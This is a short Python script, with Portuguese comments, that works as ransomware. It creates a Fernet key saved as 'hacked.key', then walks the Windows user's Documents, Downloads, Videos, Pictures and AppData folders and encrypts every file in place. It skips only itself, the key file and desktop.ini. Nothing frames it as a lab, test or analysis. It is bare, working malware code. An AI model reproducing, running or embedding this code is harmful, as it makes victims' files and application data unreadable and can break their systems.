import os 
from cryptography.fernet import Fernet

# Gera uma chave de criptografia
key = Fernet.generate_key()
with open("hacked.key", "wb") as key_file:
    key_file.write(key)

username = os.getenv('USERNAME')

folders = [
    os.path.join(r"C:\Users", username, "Documents"),
    os.path.join(r"C:\Users", username, "Downloads"),
    os.path.join(r"C:\Users", username, "Videos"),
    os.path.join(r"C:\Users", username, "Pictures"),
    os.path.join(r"C:\Users", username, "AppData", "Local"),
    os.path.join(r"C:\Users", username, "AppData", "Roaming"),
]

arquivos = []

for folder in folders:
    for root, dirs, files in os.walk(folder):
        for file in files:
            if file in ["criptografar.py","hacked.key","desktop.ini"]:
                continue
            
            file_path = os.path.join(root, file)
            arquivos.append(file_path)

for  arquivo in arquivos:
    with open(arquivo, "rb") as file:
        data = file.read()

    data_crypt = Fernet(key).encrypt(data)
    with open(arquivo, "wb") as file:
        file.write(data_crypt)
